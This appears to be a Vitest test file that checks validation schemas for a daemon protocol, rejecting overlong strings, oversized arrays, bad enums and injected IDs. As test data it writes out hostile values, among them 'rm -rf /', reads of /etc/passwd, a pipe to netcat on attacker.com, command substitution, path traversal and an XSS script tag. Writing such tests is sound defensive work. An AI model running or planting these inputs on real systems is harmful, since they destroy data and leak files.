/**
 * Tests for CADIS protocol validation schemas.
 * 
 * These tests ensure that:
 * 1. Valid daemon responses are accepted
 * 2. Invalid/malicious responses are rejected
 * 3. DoS payloads (too long strings, too many items) are rejected
 * 4. XSS payloads are sanitized
 */

import { describe, it, expect, beforeEach } from "vitest";
import {
  DaemonStatusSchema,
  ModelsListSchema,
  MessageDeltaSchema,
  MessageCompletedSchema,
  AgentSpawnedSchema,
  ApprovalRequestedSchema,
  WorkerEventSchema,
  validateSafe,
  formatValidationError,
  trackValidationFailure,
  resetValidationFailureCount,
  getValidationFailureCount,
} from "./cadisProtocolSchemas.js";

describe("DaemonStatusSchema", () => {
  it("accepts valid daemon status", () => {
    const valid = {
      model_provider: "anthropic",
      uptime_seconds: 12345,
    };
    const result = DaemonStatusSchema.safeParse(valid);
    expect(result.success).toBe(true);
  });

  it("accepts minimal daemon status", () => {
    const minimal = {};
    const result = DaemonStatusSchema.safeParse(minimal);
    expect(result.success).toBe(true);
  });

  it("rejects negative uptime", () => {
    const invalid = { uptime_seconds: -100 };
    const result = DaemonStatusSchema.safeParse(invalid);
    expect(result.success).toBe(false);
  });

  it("rejects extremely long model_provider string", () => {
    const invalid = { model_provider: "a".repeat(20000) };
    const result = DaemonStatusSchema.safeParse(invalid);
    expect(result.success).toBe(false);
  });
});

describe("ModelsListSchema", () => {
  it("accepts valid models list", () => {
    const valid = {
      models: [
        { id: "claude-3-5-sonnet", name: "Claude 3.5 Sonnet", provider: "anthropic" },
        { id: "gpt-4o", name: "GPT-4o", provider: "openai" },
      ],
    };
    const result = ModelsListSchema.safeParse(valid);
    expect(result.success).toBe(true);
  });

  it("rejects models array exceeding MAX_ARRAY_LENGTH", () => {
    const tooManyModels = Array.from({ length: 1001 }, (_, i) => ({ id: `model-${i}` }));
    const invalid = { models: tooManyModels };
    const result = ModelsListSchema.safeParse(invalid);
    expect(result.success).toBe(false);
  });
});

describe("MessageDeltaSchema", () => {
  it("accepts valid message delta", () => {
    const valid = {
      delta: "Hello, ",
      agent_id: "main",
      agent_name: "CADIS",
    };
    const result = MessageDeltaSchema.safeParse(valid);
    expect(result.success).toBe(true);
  });

  it("requires delta field", () => {
    const invalid = { agent_id: "main" };
    const result = MessageDeltaSchema.safeParse(invalid);
    expect(result.success).toBe(false);
  });

  it("rejects extremely long delta string (DoS protection)", () => {
    const invalid = { delta: "a".repeat(20000) };
    const result = MessageDeltaSchema.safeParse(invalid);
    expect(result.success).toBe(false);
  });

  it("accepts delta with XSS-like content (schema doesn't sanitize, only validates structure)", () => {
    const xssPayload = { delta: '<script>alert("xss")</script>' };
    const result = MessageDeltaSchema.safeParse(xssPayload);
    // Schema allows it - sanitization happens at render layer
    expect(result.success).toBe(true);
  });
});

describe("MessageCompletedSchema", () => {
  it("accepts valid message with content", () => {
    const valid = {
      content: "Complete message here.",
      agent_id: "worker-123",
    };
    const result = MessageCompletedSchema.safeParse(valid);
    expect(result.success).toBe(true);
  });

  it("accepts message with text field instead of content", () => {
    const valid = { text: "Alternative field name" };
    const result = MessageCompletedSchema.safeParse(valid);
    expect(result.success).toBe(true);
  });
});

describe("AgentSpawnedSchema", () => {
  it("accepts valid agent spawned event", () => {
    const valid = {
      agent_id: "worker-abc123",
      display_name: "Code Worker",
      role: "coder",
      model: "claude-3-5-sonnet",
      status: "idle",
    };
    const result = AgentSpawnedSchema.safeParse(valid);
    expect(result.success).toBe(true);
  });

  it("rejects agent_id with invalid characters (injection protection)", () => {
    const invalid = { agent_id: "worker; rm -rf /" };
    const result = AgentSpawnedSchema.safeParse(invalid);
    expect(result.success).toBe(false);
  });

  it("rejects agent_id exceeding 64 chars", () => {
    const invalid = { agent_id: "a".repeat(65) };
    const result = AgentSpawnedSchema.safeParse(invalid);
    expect(result.success).toBe(false);
  });

  it("accepts agent_id with valid characters (alphanumeric, dash, underscore)", () => {
    const valid = { agent_id: "worker-123_abc" };
    const result = AgentSpawnedSchema.safeParse(valid);
    expect(result.success).toBe(true);
  });
});

describe("ApprovalRequestedSchema", () => {
  it("accepts valid approval request", () => {
    const valid = {
      approval_id: "appr-12345",
      summary: "Execute dangerous command",
      command: "rm -rf node_modules",
      workspace: "/home/user/project",
      agent_id: "main",
    };
    const result = ApprovalRequestedSchema.safeParse(valid);
    expect(result.success).toBe(true);
  });

  it("rejects approval_id with path traversal attempt", () => {
    const invalid = { approval_id: "../../../etc/passwd" };
    const result = ApprovalRequestedSchema.safeParse(invalid);
    expect(result.success).toBe(false);
  });
});

describe("WorkerEventSchema", () => {
  it("accepts valid worker started event", () => {
    const valid = {
      worker_id: "w-789",
      cli: "cargo test",
      cwd: "/workspace",
      status: "running",
      started_at: 1234567890,
    };
    const result = WorkerEventSchema.safeParse(valid);
    expect(result.success).toBe(true);
  });

  it("rejects invalid status enum", () => {
    const invalid = {
      worker_id: "w-123",
      status: "hacked",
    };
    const result = WorkerEventSchema.safeParse(invalid);
    expect(result.success).toBe(false);
  });
});

describe("validateSafe", () => {
  beforeEach(() => {
    resetValidationFailureCount();
  });

  it("returns parsed data for valid input", () => {
    const input = { delta: "test" };
    const result = validateSafe(MessageDeltaSchema, input, "test.message");
    expect(result).toEqual({ delta: "test" });
  });

  it("returns undefined for invalid input", () => {
    const input = { invalid: "data" };
    const result = validateSafe(MessageDeltaSchema, input, "test.message");
    expect(result).toBeUndefined();
  });

  it("calls onError callback when validation fails", () => {
    let errorCalled = false;
    const onError = () => {
      errorCalled = true;
    };
    const input = { invalid: "data" };
    validateSafe(MessageDeltaSchema, input, "test.message", onError);
    expect(errorCalled).toBe(true);
  });

  it("tracks validation failures globally", () => {
    expect(getValidationFailureCount()).toBe(0);
    validateSafe(MessageDeltaSchema, { bad: "data" }, "test.1");
    expect(getValidationFailureCount()).toBe(1);
    validateSafe(MessageDeltaSchema, { bad: "data" }, "test.2");
    expect(getValidationFailureCount()).toBe(2);
  });
});

describe("formatValidationError", () => {
  it("formats single error message", () => {
    const result = MessageDeltaSchema.safeParse({ missing: "delta" });
    if (!result.success) {
      const message = formatValidationError("message.delta", result.error);
      expect(message).toContain("message.delta");
      expect(message).toContain("delta");
    } else {
      throw new Error("Expected validation to fail");
    }
  });

  it("formats multiple errors message", () => {
    const result = AgentSpawnedSchema.safeParse({
      agent_id: "invalid chars!@#",
      status: "invalid_status",
    });
    if (!result.success) {
      const message = formatValidationError("agent.spawned", result.error);
      expect(message).toContain("agent.spawned");
      expect(message).toContain("validation errors");
    } else {
      throw new Error("Expected validation to fail");
    }
  });
});

describe("validation failure tracking", () => {
  beforeEach(() => {
    resetValidationFailureCount();
  });

  it("returns false when failure count is below threshold", () => {
    for (let i = 0; i < 49; i++) {
      expect(trackValidationFailure()).toBe(false);
    }
    expect(getValidationFailureCount()).toBe(49);
  });

  it("returns true when failure count reaches threshold", () => {
    for (let i = 0; i < 49; i++) {
      trackValidationFailure();
    }
    expect(trackValidationFailure()).toBe(true);
    expect(getValidationFailureCount()).toBe(50);
  });

  it("resets counter correctly", () => {
    trackValidationFailure();
    trackValidationFailure();
    expect(getValidationFailureCount()).toBe(2);
    resetValidationFailureCount();
    expect(getValidationFailureCount()).toBe(0);
  });
});

describe("Security: DoS payload rejection", () => {
  it("rejects payloads with extremely long strings", () => {
    // Test each payload against its relevant schema
    const deltaTooLong = MessageDeltaSchema.safeParse({ delta: "a".repeat(15000) });
    expect(deltaTooLong.success).toBe(false);

    const summaryTooLong = WorkerEventSchema.safeParse({ summary: "x".repeat(12000) });
    expect(summaryTooLong.success).toBe(false);

    const commandTooLong = ApprovalRequestedSchema.safeParse({ command: "cmd ".repeat(3000) });
    expect(commandTooLong.success).toBe(false);
  });

  it("rejects payloads with too many array items", () => {
    const tooManyModels = {
      models: Array.from({ length: 1500 }, (_, i) => ({
        id: `m${i}`,
        name: `Model ${i}`,
      })),
    };
    const result = ModelsListSchema.safeParse(tooManyModels);
    expect(result.success).toBe(false);
  });
});

describe("Security: ID injection rejection", () => {
  it("rejects IDs with shell metacharacters", () => {
    const maliciousIds = [
      "id; rm -rf /",
      "id && cat /etc/passwd",
      "id | nc attacker.com 1234",
      "id`whoami`",
      "id$(uname -a)",
      "../../../etc/passwd",
      "id\nrm -rf /",
    ];

    for (const maliciousId of maliciousIds) {
      const result = AgentSpawnedSchema.safeParse({ agent_id: maliciousId });
      expect(result.success).toBe(false);
    }
  });

  it("accepts safe IDs with alphanumeric, dash, underscore", () => {
    const safeIds = [
      "agent-123",
      "worker_abc",
      "main",
      "coder-worker-2024",
      "a1b2c3",
    ];

    for (const safeId of safeIds) {
      const result = AgentSpawnedSchema.safeParse({ agent_id: safeId });
      expect(result.success).toBe(true);
    }
  });
});
